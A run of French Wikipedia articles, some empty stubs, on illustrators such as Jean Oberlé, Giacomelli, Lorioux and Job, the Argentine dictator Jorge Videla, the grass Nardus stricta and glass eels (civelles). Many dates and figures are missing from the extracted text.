En 1940, il se trouve à Broadcasting House avec Jean Marin et Paul Gordeaux quand le général de Gaulle prononce en leur présence l'appel du 18 juin. Pendant la Seconde Guerre mondiale, il est l'un des animateurs de l'équipe de la "France libre" à Radio Londres. Créateur de multiples slogans, on lui doit le fameux : . À la Libération, de retour en France il est fait chevalier de la Légion d'honneur (il était déjà chevalier de l'Ordre de la Couronne de Belgique) par décret du 23 avril 1946. 
Illustrateur plein de fantaisie et d'à-propos, il fut l'une des figures de l'après-guerre.
Il a été le compagnon de la parfumeuse Germaine Cellier (elle vivait dans son appartement du 19 rue de Lille).
Il fait partie du comité de rédaction de l'hebdomadaire "Bref", créé par l'équipe française de la BBC, reconstituée à cette occasion, dont le premier numéro parait le . Sa photographie, comme celle d'autres collaborateurs, apparaît en quatrième de couverture des trois premiers numéros. Il y collabore aussi bien comme illustrateur que comme journaliste.
Jean Oberlé repose au cimetière de Vaucresson dans les Hauts-de-Seine.
Hommages.
En 2000, la rue Jean-Oberlé dans le arrondissement de Paris prend son nom. Il existe également une rue Jean Oberlé à Brest.

</doc>
<doc id="249005" url="https://fr.wikipedia.org/wiki?curid=249005" title="Free On Board">
Free On Board



</doc>
<doc id="249010" url="https://fr.wikipedia.org/wiki?curid=249010" title="Jacques Boullaire">
Jacques Boullaire

Christian Jacques Boullaire (Paris, - Paris, ) est un dessinateur, un graveur et un peintre français.
Biographie.
Né dans une famille originaire de Champagne, normand par sa mère, Jacques Boullaire se lasse bien vite de s’occuper de la publicité des automobiles de son beau-frère, l’industriel Louis Renault (1877-1944), qui a épousé sa sœur, Christiane Boullaire (1895-1979), le .
Élève de Guy Arnoux et de Dimitrios Galanis, il commence à graver sur bois en 1926, mais ne produit ses premiers burins que dix ans plus tard. Il expose au Salon des Tuileries à partir de 1926, au Salon des indépendants de 1927 à 1945, puis au Salon d'automne à compter de 1928. Il devient par la suite invité et exposant non sociétaire de la Société de la gravure sur bois originale (SGBO), et organise des expositions particulières de ses œuvres.
Jacques Boullaire a illustré de nombreux ouvrages en exécutant différents types de gravures (bois, burins, pointes-sèches, eaux-fortes, lithographies...).
Une forte partie de son œuvre est consacrée à Tahiti, île dont est originaire sa femme, Anne Hervé-Boullaire, et dans laquelle il effectua plusieurs séjours en famille.
En 1959, Jacques Boullaire, ancien photographe d’aviation, est nommé peintre officiel de la Marine. En 1992, le Salon de la Marine, qui se déroule au Musée national de la Marine à Paris, lui rend hommage. Une première rétrospective de son œuvre avait été présentée au Musée de la Marine en 1973.

</doc>
<doc id="249013" url="https://fr.wikipedia.org/wiki?curid=249013" title="Hector Giacomelli">
Hector Giacomelli

Hector Giacomelli, né à Paris le et mort à Menton le , est un aquarelliste, graveur et illustrateur français.
Il est connu surtout pour ses peintures d'oiseaux et la précision de ses dessins de végétaux. Il a été l'illustrateur de Jules Michelet, André Theuriet, François Coppée, Alfred de Musset…
Biographie.
Né à Paris le d'un père italien professeur de chant, Hector Giacomelli est d'abord graveur avant de devenir dessinateur pour l'orfèvrerie et les bijoux de 1844 à 1854.
Il se passionne pour l'œuvre d'Auguste Raffet, qu'il rencontre dès 1837 et dont il publie le catalogue raisonné en 1862.
Vers l'âge de trente ans, une maladie grave le force à s'éloigner de Paris. Il s'installe à la campagne à côté de Tours en 1853.
Voisin d'Alfred Mame, il s'intéresse à l'ornementation et l'illustration des livres, dessine des plaques de reliures. Il dessine et peint les plantes, les insectes et les oiseaux (petits passereaux notamment) autour de sa maison de campagne.
Il a un fils, Georges Giacomelli (1855-1950), qui épouse en 1887 Marie Lecoq, fille de Félix Lecoq, inspecteur général des écoles vétérinaires de France, et nièce du botaniste Henri Lecoq.
En 1863, il s'installe à Versailles, puis en 1890 à Clermont-Ferrand, où il fait construire un chalet non loin du château de L'Oradou. Ce château acquis par Henri Lecoq en 1869 est lieu de décès de son épouse Adèle Popelin le .
Il meurt le à Menton, à la villa del Sol, où l'accueillait sa famille.
Son corps est transporté à Paris et inhumé au cimetière Montmartre dans la , avenue Saint-Charles ( ou ), dans une tombe ornée d'un petit médaillon de bronze le représentant.
Il y repose avec :
L'illustrateur.
Giacomelli se fait notamment connaître par l'illustration du texte de "La Sainte Bible selon la Vulgate", parue en 1866 chez Mame, qu'il produit avec Gustave Doré.
Dans le domaine de l'illustration naturaliste, avec un souci du détail apprécié des éditeurs et des lecteurs, il travaille pour "L'Oiseau" et "L'Insecte" de Jules Michelet en produisant des images, qui en feront un illustrateur recherché jusqu'aux États-Unis.
Il contribue par ses dessins et aquarelles à plusieurs journaux, tels que "Le Monde illustré", "Le Magasin pittoresque", "L'Illustration" ou encore "La Nature", un périodique de vulgarisation spécialisé dans les sciences.
À l'époque, ces journaux, et notamment le journal "La Nature" auquel Giacomelli a contribué de 1879 à 1886 par 21 illustrations ; figurant surtout des oiseaux, exigeait de ses illustrateurs qu'ils marient un talent de vulgarisation scientifique à l'émotion esthétique voire au pittoresque , ainsi qu'une certaine modestie, puisque contrairement aux articles, les illustrations n'étaient que rarement signées. Dans la revue "La Nature", Giacomelli est cependant particulièrement apprécié et mis en valeur : ses illustrations sont toutes publiées en pleine page, ce qui est exceptionnel. Et ce sont ses dessins qui semblent inspirer la logique des séries de textes publiés (série des nids d'oiseaux, correspondant à 12 illustrations livrées par l'artiste, accompagnant douze textes, plus fournis que d'habitude, et tous écrits par Émile Oustalet alors considéré comme ornithologue de premier plan). Hormis pour la première de ces illustrations, gravée par Fortuné Méaulle qui ne travaille qu'épisodiquement avec "La Nature", ce sont Smeeton-Tilly puis E. A. Tilly, comptant parmi les meilleurs graveurs attitrés de la revue, qui traduiront la plupart de ses dessins gouachés et/ou aquarellés en gravures prêtes à être publiées.
Il illustre aussi à titre privé les livres que lui apportent les bibliophiles fortunés. Il est l'un des organisateurs de l'Exposition des estampes du siècle de 1887 et de la section rétrospective des beaux-arts de l'Exposition universelle de Paris de 1889.
Hector Giacomelli a illustré entre autres :
La série des saisons : produite pour la revue "La Nature", de la fin de premier semestre 1882 au début du premier semestre 1883, il s'agit de quatre œuvres à caractère principalement esthétiques bien qu'accompagnées par un article de vulgarisation scientifique (aquarelles reproduites en gravure dans la revue qui les présente comme offertes au lecteurs). La première est légendée : « Le Printemps. Lilas, aubépine et papillons blancs ; Composition inédite de . Elle est suivie de « L'Été ; rose et Lucane cerf-volant ; « L'Automne. – Branches de vigne et colimaçons. ; L'Hiver. – Le grillon domestique.
Le collectionneur.
Giacomelli est également un collectionneur réputé : , écrit Henri Beraldi, 
Après sa mort seront dispersés de nombreux tableaux, dessins et aquarelles notamment signés Noël François Bertrand, Auguste Bigand, Karl Bodmer, Charles-François Daubigny, Eugène Delacroix, Auguste Raffet, ainsi que des sculptures, notamment d'Antoine-Louis Barye, Pierre-Jules Mêne et Auguste Cain. Sa collection a été dispersée aux enchères en 1905.
Œuvre.
Le peintre des oiseaux.
L'une des pièces les plus souvent reproduites de Giacomelli est intitulée "Passereaux alignés sur une tige de bois".
On y voit 24 passereaux de couleurs variées, serrés les uns contre les autres et regardant dans toutes les directions.

</doc>
<doc id="249014" url="https://fr.wikipedia.org/wiki?curid=249014" title="Coliiforme">
Coliiforme



</doc>
<doc id="249015" url="https://fr.wikipedia.org/wiki?curid=249015" title="Félix Lorioux">
Félix Lorioux

Félix Auguste Henri Marie Lorioux, dit Félix Lorioux, est un artiste peintre et illustrateur français né le à Angers, mort le dans le de Paris.
Biographie.
Félix Lorioux fait ses études à l'École des beaux-arts d'Angers. Il commence sa carrière comme dessinateur de publicité, entre autres pour le compte d'André Citroën. En 1910 il rencontre les frères imprimeurs Draeger qui l'initient aux techniques publicitaires. Parallèlement il dessine dans la presse et l'édition : il travaille pour "Lectures pour tous", "Le Courrier français", "Je sais tout", la "Gazette du Bon Ton", "La Semaine de Suzette" et à la « Select-Collection ». Certains de ses dessins sont signés « FX LX ».
En 1904, il se marie avec Élisabeth Grolleau.
Au début des années 1920, il illustre Le "Roman de Renart" écrit par Odette Larrieu et publié chez Hachette, dans un style proche de Benjamin Rabier et de Félix Pol Jobbé-Duval.
En 1926, il met en images les "Contes de Perrault" pour lecteurs débutants avec un texte réduit à de simples légendes en bas des planches. Il illustre une centaine d'albums pour les enfants. Walt Disney lui confie l'adaptation française des "".
Le style résolument fantastique de Lorioux compromet le caractère stéréotypé du personnage de Mickey et Walt Disney ne donne pas suite. Dessinateur au trait virevoltant, remarquable coloriste, Félix Lorioux peint le monde avec le regard enjoué de l’enfance et on peut y voir l'influence de l'Art nouveau et de sa tradition japonisante. Il excelle dans une représentation onirique de la nature : les tons rouges et orangés dominent, la faune espiègle et la flore luxuriante respirent la joie de vivre. Ses publicités animalières pour les biscottes "Magdeleine" en sont un exemple.
Ses albums pour enfants les plus connus sont "Don Quichotte", "Les Fables de la Fontaine", "L'arche de Noé" et la série du "Buffon des enfants".
Il meurt en 1964 et est inhumé à Angers au cimetière de l'Est.

</doc>
<doc id="249016" url="https://fr.wikipedia.org/wiki?curid=249016" title="Alessandro Battilocchio">
Alessandro Battilocchio

Alessandro Battilocchio (né le à Rome) est un homme politique italien, ancien député européen de juin 2004 à , le plus jeune député alors du Parlement européen et le plus jeune maire italien (mairie de Tolfa, Latium). 
Biographie.
Alessandro Battilocchio est membre du Nouveau Parti socialiste italien pour la circonscription Centre, d'abord non-inscrit à un groupe parlementaire du PE, puis membre du groupe du Parti socialiste européen.
Il est élu député du NPSI lors des élections générales italiennes de 2018 avec l'appui de Forza Italia et de la Ligue du Nord.

</doc>
<doc id="249020" url="https://fr.wikipedia.org/wiki?curid=249020" title="Ron jeremy">
Ron jeremy



</doc>
<doc id="249021" url="https://fr.wikipedia.org/wiki?curid=249021" title="Colobinés">
Colobinés



</doc>
<doc id="249022" url="https://fr.wikipedia.org/wiki?curid=249022" title="Nardus stricta">
Nardus stricta

Nardus stricta, le nard raide, est une espèce de plantes herbacées de la famille des "Poaceae" (Graminées). C'est la seule espèce actuellement acceptée du genre Nardus.
Étymologie.
"Nardus" dérive de "nardos", nom grec de cette plante.
Caractéristiques.
Appelée aussi poil de bouc, cette graminée est considérée comme une mauvaise herbe dans les pâtures de montagne où elle peut devenir très envahissante et remplacer peu à peu les herbes comestibles. Sa faible appétence, surtout avant le stade épiaison (faibles palatabilité, qualité nutritionnelle et digestibilité), explique son refus par le bétail qui peut représenter jusqu'à 80 % de la productivité primaire annuelle des parcours montagnards.
Hémicryptophyte, cette xérophyte sclérophylle a une adaptation originale pour résister à la sécheresse : ses feuilles s’enroulent dès que leur teneur en eau s’abaisse en dessous de 85 %, minimum caractéristique de l'espèce.

</doc>
<doc id="249023" url="https://fr.wikipedia.org/wiki?curid=249023" title="Job (illustrateur)">
Job (illustrateur)

Jacques Onfroy de Bréville, dit Job, est un dessinateur, caricaturiste et illustrateur français né le à Bar-le-Duc et mort le à Neuilly-sur-Seine.
Son nom d'artiste, « Job », est composé à partir de l'initiale de son prénom usuel Jacques et de celles de son nom de famille, Onfroy de Bréville. Son père s'étant opposé à ce qu'il entre à l'École des beaux-arts à sa sortie du collège Stanislas, il s'engage dans l'armée, mais revient à Paris en 1882. De cet intermède, il conserve un goût immodéré pour la chose militaire, le patriotisme, voire le chauvinisme. Il intègre enfin l'École des beaux-arts et expose au Salon des artistes français en 1886. Il y reçoit un accueil mitigé. Il commence alors une carrière de dessinateur et contribue à "La Caricature" et à "La Nouvelle Lune" à coup de portraits charges.
Job est connu pour ses remarquables illustrations de livres d'enfants, dont les textes sont le plus souvent de Georges Montorgueil. Ses grandes compositions en couleurs ont contribué à entretenir le culte des héros de la nation. Ses dessins de Napoléon et de Murat ont peuplé l'imaginaire de générations d'enfants. Son sens du détail se retrouve dans "L'Épopée du costume militaire français". Même dans les albums destinés aux enfants, il veille à reproduire les uniformes avec une extrême précision.
Ses livres les plus réputés sont "Murat", "Le Grand Napoléon des petits enfants", "Jouons à l'histoire", "Louis XI", "Napoléon", "Bonaparte" et "Les Gourmandises de Charlotte". Il a également illustré la vie de Washington et s'est fait connaître aux États-Unis. Artiste plein de verve et de gaieté, il a été sociétaire des humoristes et a exposé aux Incohérents. Son atelier est reconstitué au musée de Metz.
Biographie.
Jacques Onfroy de Bréville naît le à Bar-le-Duc en Lorraine. Il est le fils de Georges Marie Onfroy de Bréville, substitut du procureur à Avallon, et de son épouse Anatoline Robertine née du Val d'Eprémesnil. Il a un frère, Pierre, né en 1861 et qui devient plus tard un musicien reconnu. Le jeune Jacques se montre très vite doué pour le dessin et croque de nombreuses saynètes militaires, à l'image de la "Prise de Chartres" qu'il réalise à l'âge de 7 ans. En 1868, après que sa famille a déménagé à Paris, il entre à l'école Bossuet avant de poursuivre sa scolarité au collège Stanislas. À la même époque, il compose des pièces de théâtre avec son frère tout en s'intéressant à la caricature : il signe ainsi en 1876 une « Petite Définition » rappelant l'attitude de l'écrivain Victor Hugo en faveur des communards.
Distinctions.
Jacques Onfroy de Bréville est chevalier de la Légion d'honneur.
Voir aussi.
Liens externes.
 

</doc>
<doc id="249024" url="https://fr.wikipedia.org/wiki?curid=249024" title="Jorge Rafael Videla">
Jorge Rafael Videla

Jorge Rafael Videla Redondo, né à Mercedes dans la province de Buenos Aires le et mort en prison le , est un général et homme d'État argentin.
Il dirige l'Argentine et la guerre sale après le coup d'État militaire du 24 mars 1976, qui destitue Isabel Perón et instaure une dictature. En 1981, il cède la présidence de la junte au général Roberto Eduardo Viola. Il est placé en résidence surveillée au retour de la démocratie en 1983, puis condamné à la prison à perpétuité lors du procès de la junte de 1985. Alors qu'il est amnistié en 1989 par le président Carlos Menem, son dossier est rouvert en 2007, et la procédure se conclut le par une condamnation à la prison à vie, suivie de plusieurs autres.
Biographie.
Jeunesse et famille.
Jorge Rafael Videla est né en 1925, dans la ville de Mercedes, il est le troisième des cinq fils du colonel Rafael Videla Eugenio Bengolea (1888-1952) et de Maria Olga Redondo Ojea (1897-1987).
En , Jorge Videla épouse Alicia Raquel Hartridge, fille de Samuel Alejandro Hartridge Parkes (1890-1967), professeur de physique et ambassadeur d'Argentine en Turquie, et de María Isabel Lacoste Álvarez (1894-1939).
Ils ont sept enfants : María Cristina (1949), Jorge Horacio (1950), Alejandro Eugenio (1951-1971), María Isabel (1958), Pedro Ignacio (1966), Fernando Gabriel (1961) et Rafael Patricio (1953).
Éducation et carrière militaire.
Né d'un père colonel, il obtient un diplôme du Collège militaire de la nation en 1944, puis entame sa carrière militaire. Après avoir travaillé au ministère de la Défense de 1950 à 1962, il prend la direction de l’académie militaire en 1962. En 1971, Videla devient général, puis deux années plus tard chef d’état-major, avant d’être nommé, en 1975, commandant en chef de l’armée argentine, sous la présidence d’Isabel Perón, qui avait succédé à son époux.
La dictature.
Le , Videla, à la tête d'une junte militaire, s’empare du pouvoir par la force. La junte restera en place jusqu'au . Elle se compose dans un premier temps de Videla, du commandant de la marine, l’amiral Emilio Massera, et du commandant des forces aériennes, le brigadier-général Ramón Agosti. Videla cède la présidence de la junte au général Roberto Viola en 1981. La Junte reçoit immédiatement le soutien des États-Unis, qui avaient déjà été avertis du coup d’État en préparation. L’ambassadeur Robert Hill explique dans un câble diplomatique : « Nous devons clairement éviter d’être assimilés à la junte. Ce ne serait bon ni pour elle ni pour nous. Néanmoins, dans la mesure où le nouveau gouvernement conservera cette position modérée, nous devons prêter attention à toute sollicitation d'aide qu'il nous adressera. » En avril 1976, les États-Unis fournissent 5 millions de dollars en aide militaire au régime de Videla. Le FMI accorde de son côté un crédit de 17 millions de dollars. Sous la conduite du ministre de l’Économie José Alfredo Martinez de Hoz, la Junte favorise des réformes d'inspirations néolibérale. 
Les militaires argentins répriment brutalement l'opposition de gauche, lors de la « guerre sale », qui n'a de guerre que le nom. Les guérillas (l'ERP et les Montoneros) étaient déjà démantelées en , et les militaires s'attaquent aux opposants civils : politiques, syndicalistes, prêtres et nonnes — Alice Domon et Léonie Duquet, Gabriel Longueville, et d'autres —, Mères de la place de Mai ainsi que leurs familles, leurs enfants, leurs amis, leurs voisins, etc. Cette entreprise aujourd'hui qualifiée par la justice argentine de « génocide » (voir par exemple la condamnation, en 2008, du général Antonio Domingo Bussi), est justifiée par la junte au nom d'un anticommunisme virulent, lié à un national-catholicisme prétendant défendre la grandeur de la « civilisation catholique occidentale » contre les « rouges » et les « juifs ». 30 000 personnes sont victimes de disparitions forcées sous la dictature, cinq centres clandestins de détention et de torture créés, tandis qu'au moins sont contraintes à l'exil, clandestinement dans les premières années de la junte, qui refuse alors de délivrer des visas de sortie.
La junte militaire se débarrasse des « subversifs » au cours de vols de la mort : « On leur donnait plusieurs doses de sédatif qui les endormaient complètement. On les déshabillait une fois évanouis. Et quand le chef de bord donnait l'ordre, en fonction de la position de l'avion, au large de Punto Indio, on ouvrait la porte de la carlingue et on jetait les corps nus un par un. ». Au cœur de la période de dictature, et malgré des protestations venues de nombreuses personnalités dans le monde, c'est Jorge Videla qui remet la Coupe du monde de football 1978 au capitaine de l'équipe argentine, Daniel Passarella, « "El Pistolero" ». Cette Coupe du monde se déroule au moment même où tortures et assassinats s'enchaînet dans les sous-sols de l'ESMA (École supérieure de mécanique de la Marine), à proximité des stades de Buenos Aires, où se déroulent les matches dans la liesse populaire.
La fin du régime.
Affaiblie par sa défaite face au Royaume-Uni lors de la guerre des Malouines, la dictature militaire cède la place en 1983 à un gouvernement civil élu démocratiquement avec pour président le radical Raúl Alfonsín.
Procès.
Videla est jugé avec d'autres membres de la junte, ainsi que d'ex-guérilleros, lors du procès de la junte de 1985, et condamné à la perpétuité. Entre autres affaires, on le juge coupable d'homicides dans le massacre de Margarita Belén. Il est amnistié en 1989 par le président Carlos Menem, mais cette amnistie est annulée en 2007 par un tribunal, sentence confirmée en appel en (la Cour suprême a requis une peine de prison à perpétuité).
Videla est jugé dans quatre procès différents :
Il bénéficie d'une assignation à résidence de 1998 à 2008, mais celle-ci est annulée par le juge fédéral Norberto Oyarbide, chargé de l'enquête sur l'opération Condor, qui le fait transférer à la prison de Campo de Mayo en . Par ailleurs, à la suite de l'identification, par l'Équipe argentine d'anthropologie judiciaire (EAAF), de la dépouille de l'Argentin-Allemand Rolf Nasim Stawowiok, un jeune militant de 20 ans de la Jeunesse péroniste enlevé le puis enterré anonymement, un magistrat allemand de Nuremberg ouvre une enquête contre l'ex-dictateur.
Le , il est condamné dans l'affaire du vol de bébés d'opposantes détenues à 50 ans de prison pour avoir mis en place un plan systématique.
Il meurt en prison le à l'âge de 87 ans. Le procès de l'Opération Condor, dans lequel il avait été cité, avait été amorcé deux mois plus tôt.

</doc>
<doc id="249028" url="https://fr.wikipedia.org/wiki?curid=249028" title="Nasalis">
Nasalis



</doc>
<doc id="249029" url="https://fr.wikipedia.org/wiki?curid=249029" title="Civelle">
Civelle

Civelle et pibale (de son nom occitan "pibala") sont des noms régionaux désignant l'alevin de l'anguille d'Europe lorsqu'il pénètre dans les fleuves.
Avec un maximum de par kilogramme, la larve de l'anguille mesure lorsqu'elle quitte la mer des Sargasses pour rejoindre les eaux continentales, où elle devient adulte en douze mois.
Migration.
L'anguille d'Europe effectue dans sa vie deux très longues migrations (plus longues que celles de ses "cousines" américaines et japonaises) ; 
La migration « "aller" » durant laquelle la toute jeune larve planctonique (leptocéphale) subira ses premières métamorphoses et deviendra peu à peu civelle. La larve se laisse d'abord porter par le Gulf Stream. Durant ce long voyage, la larve ne semble pas ou très peu s'alimenter. Après et près d'un an passé en mer, le courant l'a conduite devant les côtes de l’Europe (France et Espagne pour la plupart des civelles). Désormais, son but est de s'engager dans un estuaire et de remonter un fleuve afin de rejoindre l'eau douce et remonter les rivières pour y vivre, ou rejoindre les mares, étangs et fossés où elle grandira. Poussées par leur instinct, les civelles sont capables d'escalader des parois presque verticales (murs, barrages) pourvu qu'elles soient humides, ou de se faufiler dans les interstices entre les pierres de construction des vieux seuils pour les franchir. Cependant des marches verticales lisses peuvent constituer un obstacle infranchissable. Elles peuvent aussi contourner des obstacles de faible hauteur en passant par les berges enherbées ou rugueuses par temps de pluie. Les anguilles adultes peuvent serpenter sur plusieurs kilomètres sur le sol humide, en respirant par la peau, les branchies et une ébauche de poumons, pour gagner des mares et étangs isolés. Elle y grandit pour atteindre le stade adulte ("anguille jaune") et achever sa quatrième et dernière métamorphose qui l’amène à se transformer en "anguille argentée". Elle a alors 5 à (les femelles maturent plus tard que les mâles) et est alors presque prête à se reproduire.
La seconde migration se fait en sens inverse, au stade adulte, quand la maturité sexuelle approche (elle nécessite le passage en mer et à grande profondeur). L'anguille descend le cours d’eau qu’elle avait si laborieusement remonté : c'est la dévalaison ou avalaison (migration sens amont vers aval). Elle effectue ensuite son long retour à la mer des Sargasses, en profondeur, vers les lieux de fraie, dans les profondeurs de la mer des Caraïbes, là où cette espèce se reproduit depuis d'années. Elle meurt après s'être reproduite. Le cycle est alors achevé et une autre génération le recommence.
Une grande partie des civelles franchissaient autrefois les milliers de vannages et petits barrages des moulins à eau, dont certains existent depuis le Moyen Âge et qui bénéficiaient de l'ouverture des vannages le dimanche (chômage dominical) et lors des hautes eaux, ce qui facilitait le passage des poissons et l'entretien des biefs. Mais l'abandon de l'usage de nombreux seuils de moulins et la transformation de certains pour l'hydroélectricité a réduit les périodes d'ouverture des vannages (pour ceux en service, ouverture seulement en périodes de crues) et induit des mortalités dans les turbines lors de la dévalaison. L'anguille est particulièrement touchée du fait de la grande longueur et de sa capacité à se faufiler entre les barreaux des grilles de protection. De plus, la construction des grands barrages modernes a totalement bloqué de nombreux axes de migration, comme toute la Loire en amont de Roanne. Ces ouvrages ont aussi localement transformé les méthodes de pêche et facilité le braconnage. Les civelles bloquées devant ces ouvrages sont plus accessibles aux pêcheurs ou braconniers qui viennent les traquer, ainsi qu'aux prédateurs.
Éthologie.
La civelle a un comportement nettement lucifuge (elle fuit la lumière) sauf quand elle n'a pas d'autres choix que de s'exposer, comme lors du franchissement d'obstacles naturels ou artificiels.
La densité et la disponibilité en abris influe donc sur son comportement migratoire et de repos. La nuit elle tend à remonter vers la surface (et également dans une eau très trouble comme on en trouve en période de crue, dans certains cours d'eau ou dans le bouchon vaseux des estuaires).
Son comportement varie aussi selon la densité de civelles.
Détermination du sexe.
Dans les premières étapes, on ne connait pas le sexe des anguilles. C'est au cours de leur croissance, au stade « anguille jaune » que des changements hormonaux induisent la différenciation sexuelle. Elles sont incolores (transparentes) et possèdent une taille de 5 à . Les civelles qui survivent dans les rivières deviennent des anguilles qui changeront de couleur : l'anguille jaune a le dos couleur café, passe au vert puis devient finalement argentée.
La civelle de l'anguille d'Europe.
Lors de son périlleux voyage, la civelle de l'anguille d'Europe rencontre de nombreux obstacles avant de devenir une anguille argentée, contributrice au stock de géniteurs pour accomplir un nouveau cycle biologique. Différents facteurs de mortalité d'origine marine ou continentale sont à l'origine du déclin de l'espèce.
Jusque dans les , la pêche des civelles était surtout une activité secondaire destinée à compléter l’alimentation des habitants, agriculteurs ou riverains des cours d'eau pour la plupart. Le « plat du pauvre » était fréquemment au menu, en France, jusque dans les cantines scolaires où les civelles étaient servies froides, sous forme de pain. Lorsqu’elles étaient trop abondantes, les poules s’en régalaient volontiers. À cette époque, l’anguille étant considérée comme un nuisible, la pêche de ces alevins n’avait guère de limites. Peu à peu, un marché s'est organisé et l’activité s’est professionnalisée, augmentant ainsi fortement les quantités pêchées. La demande étant croissante, les quantités pêchées l'ont aussi été, atteignant /an dans les , contre seulement en 2010, année où les exportations hors de l'UE ont été interdites.
Les acheteurs légaux ou non de cette denrée, autrefois locale, sont désormais des pays tels que l’Espagne, le Mexique, la Russie et le marché noir asiatique.
Les pays asiatiques exercent une forte demande de civelles vivantes pour l’élevage. En effet, il a jusqu’alors été impossible de faire se reproduire des anguilles en captivité et la seule solution connue est de prélever des alevins. Les civelles sont élevées principalement en Chine et revendues adultes au Japon, en Corée du Sud et à Taïwan où leur chair est très appréciée.
Les prix de vente oscillent entre 150 et 200 euros le kilogramme ; on relève même le prix record de en 2025.
Sachant qu’il faut environ pour obtenir un kilogramme, les pêcheurs prélèvent un nombre important de civelles qui n’atteindront jamais l’âge adulte et n’iront donc pas se reproduire dans la mer des Sargasses. De ce fait, s’est rapidement posée la question de la menace exercée par le braconnage pour l'espèce provoquant la diminution de la ressource voire la disparition de l’anguille. Plusieurs solutions ont été mises en place pour tenter d’y remédier, sous l'égide de la police de l'environnement, notamment exercée par l'Office national de la biodiversité.
A titre d'exemple, en 2017, un trafic de millions de civelles vivantes envoyées de l'Espagne via le Royaume-Uni vers Hong Kong (export illégal de de civelles, soit et une valeur estimé à d'euros sur la période 2015 - 2017) a été stoppé par un tribunal de Londres et l'agence de lutte contre le crime organisé (NCA). Gilbert Khoo, vendeur de fruits de mer et principal prévenu a été jugé en 2020.
Règlementation.
 , depuis le 25 septembre 2010 (Cf Article R436-65-3 du Code de l'environnent, Décret n°2010-1110 du 22 septembre 2010 - art-1), la pêche à la civelle est sévèrement réglementée en France.
L'Article R436-65-3 précise en son alinéa 1 que la pêche de la civelle de moins de 12 cm est interdite en tous lieux aux pêcheurs de loisir.
De plus (alinéa 2) elle est interdite à tout pêcheur, tant professionnel que de loisir, sur l'ensemble des cours d'eau (affluents, sous-affluents compris) et les canaux dont l'embouchure est située sur la façade méditerranéenne, ainsi que dans les lagunes et étangs salés avec accès sur la mer Méditérranée.
Seuls les pêcheurs munis d’une licence sont autorisés à pratiquer cette activité sur les autres facades (facade atlantique, la Manche et la mer du Nord), limitée dans le temps sur cinq mois, généralement de novembre à mars. Les modalités (temps, quotas) sont fixées par un arrêté conjoint du ministre chargé de la pêche en eau douce et du ministre chargé de la pêche maritime (alinéa 3).
Les bateaux ne doivent pas dépasser une longueur de , une puissance de et une vitesse de . Leurs tamis à mailles très fines (diamètre de maximum) sont munis d’un long manche quand les civelles nagent en profondeur ou d’un manche plus court lorsqu’elles se trouvent à la surface. Les heures de pêche sont elles-mêmes réglementées. Excepté en Charente Maritime : deux fois d'ouverture et .
On estime à moins de 20 % la pression exercée par la pêche sur l'espèce. Les seules données disponibles en France sont fournies par des pêcheurs professionnels, mobilisés sur le PGA (Plan de Gestion de l'Anguille, de 2010) qui est une déclinaison du règlement européen de CE 1100/2007 qui institue des mesures de reconstitution du stock d'anguilles européennes. Le PGA français approuvé par l'Europe en 2010 vise à agir sur cinq axes : lutter contre le braconnage, améliorer la continuité écologique, réduire la pression par pêche, diminuer les pollutions, et mettre en place le repeuplement. Rien n'est repris en revanche dans ce plan national concernant les prédateurs de l'espèce, notamment le silure (super-prédateur des milieux aquatiques français, et considéré par le MNHN comme espèce introduite envahissante).
La France au sein de l'Europe a une responsabilité particulière, pour cette espèce, dans la mesure où l'on considère que 80 % des recrutements de civelles pour l'anguille européenne se font sur la façade maritime française.
Pour que les civelles et autres migrateurs (saumon, alose, lamproie marine, truite de mer) puissent mieux effectuer leurs migrations vers l'amont et leur dévalaison, les barrages doivent s'équiper en passes à poissons et de grilles suffisamment fines pour les canaux de turbinage, s'ils ne peuvent être ouverts en période de migration. Il existe des dispositifs spécifiquement dévolus aux anguilles.
État des populations, pressions, menaces.
Malgré le classement de l'anguille en liste rouge de l'UICN, et de nombreux aménagements destinés à faciliter ses migrations, l'espèce est en forte régression. Les populations de l'anguille d'Europe se sont effondrées en une trentaine d'années, au point que l'anguille, qui était l'un des poissons les plus communs jusque dans les (alors que la plupart des barrages étaient déjà construits) est devenue une espèce en voie d'extinction et classée vulnérable par l'UICN et l'Union européenne. En France la population a diminué de 75 % en .
Plusieurs causes sont pointées, qui sans doute cumulent leurs effets (avec même de possibles effets synergiques) :
Ce sont autant de facteurs qui concourent au déclin de l'anguille dans de nombreuses régions d'Europe et d'Amérique.
Civelle invasive.
Paradoxalement, alors que les civelles disparaissaient en Atlantique, en 2005, une espèce asiatique de civelle s'est mise à proliférer en mer de Chine orientale. On dénombre jusqu'à par kilogramme d"Anguilla japonica" et huit mois suffisent pour qu'elle atteigne le poids requis pour la vente.
On a cependant découvert que du "Vert de malachite" a été largement utilisé par de nombreux pisciculteurs chinois comme désinfectant pour réduire les risques sanitaires dans leurs viviers. Or, ce produit est un cancérigène avéré. Ceci a stoppé provisoirement l'exportation vers l'Europe de cette espèce.
Usages culinaires.
Au Pays basque, il était traditionnel dans la gastronomie de Biscaye et du Guipuscoa, mais sa popularité a été étendue à d'autres parties du territoire en Espagne. Dans une grande partie de l'Espagne et du sud-ouest de la France, la civelle est considérée comme un mets très fin lorsque légèrement frite et servie en caquelon. Avec un prix de le kilogramme payé au pêcheur en 2004, la pression halieutique est très forte sur cette espèce que l'on ne sait toujours pas faire se reproduire en captivité.
Le plat le plus connu sont les civelles à la Bilbaïna ("Angulas a la bilbaína / Angulak Bilboko eran") servie dans une cazuela en terre cuite avec de l'ail et une variété de piment local fumée. Elle est aussi connue dans la cuisine française dans les secteurs de Nantes, de La Rochelle et Bordeaux.
Les civelles ("angula" en espagnol et en basque) sont généralement commercialisées cuites. Vivantes elles sont transparentes. On les trouve d'habitude conditionnées sous vide.
Les civelles s'achètent généralement précuites et conditionnées sous vide. Dans ce cas, . Le temps passé dans les rivières est fondamental ; les noires ont passé davantage de temps et sont généralement moins valorisées. Dans le cas des vivantes, on les tue généralement avec une décoction froide de feuilles de tabac, puis elles sont lavées (surtout pour ôter le mucus) et sont cuites dans une saumure où elles acquièrent la couleur blanche habituelle.
Elles peuvent aussi être ajoutées dans des salades ou bien comme accompagnement de plats de poisson, de mollusques ou de crustacés.
En région nantaise dans les , une fois blanchie, la civelle accompagnée d'une vinaigrette légèrement huilée et à base de vinaigre de vin servait d'entrée lors des repas en famille.
Succédané de la civelle.
Les prix très élevés de la civelle sur les marchés de poisson, et sa pénurie ont rendu très populaire un succédané de civelles, populairement dénommé "gula," nom qui correspond à une marque commerciale de ce produit. Il est élaboré en surimi à base de morue d'Alaska.
